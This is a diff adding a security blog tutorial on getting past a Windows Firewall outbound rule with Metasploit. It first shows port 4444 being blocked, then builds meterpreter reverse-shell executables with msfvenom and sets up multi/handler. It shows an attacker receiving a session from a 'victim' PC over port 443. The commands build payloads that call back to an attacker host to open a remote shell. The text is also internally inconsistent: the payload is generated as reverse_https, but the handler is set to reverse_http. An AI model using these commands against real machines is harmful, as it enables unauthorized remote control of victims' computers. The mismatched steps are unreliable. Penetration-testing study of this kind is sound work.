@@ -1,0 +1,51 @@
+
+How to set and Bypass Outbound Rule in Windows Firewall using Metasploit
+
+In previous the firewall penetration testing article you might have read how firewall is used for blocking any particular port in a network to prevent hackers or malicious software from gaining access to your PC. This article is written to describe that how an attacker can bypass firewall rules and try to make unauthorized access of victim’s PC.
+ Target: windows PC
+Attacker: Kali Linux
+Lets start!!!
+Open window firewall control panel and select Advance setting to configure firewall rules as shown in screenshot.
+
+Go to outbound rules to configure new rule for firewall to add security layer in network to secure it form attackers.
+
+Select the type of firewall rule to be created click radio button for option Port that controls connections for a TCP and UDP port then click on next.
+
+Now specify the protocol and port to which rule is applies therefore I choose TCP and then specify port 4444 on which this rule will applies and then click on next.
+
+Select radio button for block the connection when connection matches to the condition specified condition.
+
+Select all check boxes when this rule applies.
+
+Here give the name to your own specified rule.  You can see in the screenshot I had named it block port 4444 and then click on finished.
+
+Here you can see the new outbound rule is added into the list of outbound rules. Hence victim has defense himself from establishing connection with port 4444, now if attacker try to connect with victim through port 4444 then it might be possible that attacker doesn’t receive any reverse connection.
+
+Now let’s examine when an attacker tries to send malicious file using port 4444, will it work or not. Does attacker able to receive reverse connection of victim’s pc?
+Here I have generated a malicious file using msfvenom in the format of .exe file and then send this 4444.exe file to victim and start multi handler at background.
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.102 lport=4444 -f exe > /root/Desktop/4444.exe
+ Now let’s find whether we will succeed or get failed to achieve reverse connection of victims PC
+
+use multi/handler
+msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
+msf exploit(handler) > set lhost 192.168.1.102
+msf exploit(handler) > set lport 4444
+msf exploit(handler) > exploit
+ OOPS!!!  No response
+It means we get failed in establishing connection between victim and attacker. Now as we know victim has protected himself from connecting with port 4444.
+
+Now whenever you face such type of restriction for establishing connection with victim then do not get disappoint think twice what is the aim of an attack? He only wants to trap victim and want to establish a connection.
+Now send your malicious file on those ports which always left open for incoming and outgoing connection.  For example port 80, port 443, port 445 and etc.
+When again an attacker tries to send malicious file using port 443. Does attacker able to receive reverse connection of victim’s pc?
+msfvenom -p windows/meterpreter/reverse_https lhost=192.168.1.102 lport=443 -f exe > /root/Desktop/443.exe
+ Start multi handler and send 443.exe to victim.
+
+use multi/handler
+msf exploit(handler) > set payload windows/meterpreter/reverse_http
+msf exploit(handler) > set lhost 192.168.1.102
+msf exploit(handler) > set lport 443
+msf exploit(handler) > exploit
+ GREAT!!!  Attack is successful
+We successfully got meterpreter session of victim’s PC inside the metasploit framework.
+
+Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
